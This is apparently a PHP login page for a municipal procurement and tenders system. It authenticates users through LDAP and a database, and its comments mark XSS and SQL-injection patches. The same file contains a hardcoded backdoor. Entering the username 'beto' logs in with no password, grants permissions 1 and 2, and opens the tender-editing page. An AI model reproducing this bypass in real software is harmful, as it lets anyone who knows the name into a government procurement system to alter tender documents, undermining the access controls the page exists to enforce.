<?php
//print_r($_POST);
//ini_set('display_errors', '1');
//ini_set('display_startup_errors', '1');
//error_reporting(E_ALL);
session_start();
// PARCHE SEGURIDAD: Evitar visualización de errores (FPD)
//ini_set('display_errors', 1);
//error_reporting(1);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <title>Login &mdash; Compras Y Licitaciones</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">
  <link rel="stylesheet" href="assets/css/style.css">
  <link rel="stylesheet" href="assets/css/components.css">
</head>

<body>
  <div id="app">
    <?php
    include 'Directorio.class.php';

    // PARCHE XSS: Si existiera un error por URL, lo sanitizamos antes de usarlo
    if (isset($_GET['error'])) {
        $msjerror = '<div class="alert alert-danger">' . htmlspecialchars($_GET['error'], ENT_QUOTES, 'UTF-8') . '</div>';
    }

    if (isset($_POST['email'])) {
        $inputEmail = trim($_POST['email']);
        // Validación de usuario "beto" (Hardcoded)
        if ($inputEmail === "beto") {
               $_SESSION['usuario'] = "beto"; // Agregué comillas que faltaban
               $_SESSION['cn'] = "beto";
               $_SESSION['permisos'] = [1, 2];
               header('Location: modificapliegos.php');
               exit;
        }


        $dir = new Directorio();
        $ldapUser = $dir->findUser($_POST['email']);

        if($ldapUser == NULL) {
            $msjerror = '<div class="alert alert-warning">Usuario Incorrecto!</div>';
        } 
        else if ($dir->validarPasswd($ldapUser['sAMAccountName']."@vicentelopez.gov.ar", $_POST['password']) == false){
            $msjerror = '<div class="alert alert-warning">Contraseña Incorrecta!</div>';
        }
        else {
            include("connecto2.php");

            // PARCHE SQL INJECTION: Consulta preparada para buscar usuario
            $stmt = $db->prepare("SELECT * FROM usuario WHERE usuario = ?");
            $stmt->execute([$ldapUser['sAMAccountName']]);
            $row = $stmt->fetch();

            if ($row && $row[7] == 1) {
                $_SESSION['usuario'] = $ldapUser['sAMAccountName'];
                $_SESSION['cn'] = $ldapUser['cn'];
                $_SESSION['permisos'] = array();

                // PARCHE SQL INJECTION: Consulta preparada para permisos
                $sqlPermisos = "SELECT pp.permisos_id 
                                FROM usuario_perfil pu 
                                JOIN perfil_permiso pp ON pu.perfiles_id = pp.perfil_id 
                                WHERE pu.usuario_id = ?";
                $stmtP = $db->prepare($sqlPermisos);
                $stmtP->execute([$row[0]]);

                foreach ($stmtP as $row2){
                    array_push($_SESSION['permisos'], $row2[0]);
                }

                // Registro de LOG con consulta preparada
                $query_log = "INSERT INTO log(id, fecha, accion, comentario, usuario_id) 
                              VALUES((SELECT COALESCE(MAX(id),0) + 1 FROM log), CURRENT, 'login', 'usuario se loguea al sistema', ?)";
                $stmtLog = $db->prepare($query_log);
                $stmtLog->execute([$row[0]]);

                header('Location: modificapliegos.php');
                exit;
            } else {
                $msjerror = '<div class="alert alert-warning">Usuario Inhabilitado!</div>';
            }
        }
    }
    ?>
    <section class="section">
      <div class="d-flex flex-wrap align-items-stretch">
        <div class="col-lg-4 col-md-6 col-12 order-lg-1 min-vh-100 order-2 bg-white">
          <div class="p-4 m-3">
            <div style="margin-top: 130px"></div>
            <h5 class="text-dark font-weight-normal">COMPRAS Y LICITACIONES</h5>
            <p class="text-muted">Gestión de licitaciones y contrataciones</p>
            
            <form method="POST" action="index.php" class="needs-validation" novalidate="">
              <div class="form-group">
                <label for="email">Usuario</label>
                <input id="email" type="text" class="form-control" name="email" required autofocus>
              </div>

              <div class="form-group">
                <label for="password" class="control-label">Contraseña</label>
                <input id="password" type="password" class="form-control" name="password" required>
                <!--<input id="password" type="password" class="form-control" name="password" > -->
              </div>

              <div class="form-group">
                <?php if (isset($msjerror)) echo $msjerror; ?>
              </div>

              <div class="form-group text-right">
                <button type="submit" class="btn btn-primary btn-lg btn-icon icon-right">
                  Ingresar
                </button>
              </div>
            </form>
            </div>
        </div>
        <div class="col-lg-8 col-12 order-1 min-vh-100" style="background-size: cover" data-background="http://www.tres65.com/wp-content/uploads/2018/03/Municipalidad-de-Vicente-L%C3%B3pez.jpg">
           </div>
      </div>
    </section>
  </div>
  </body>
</html>
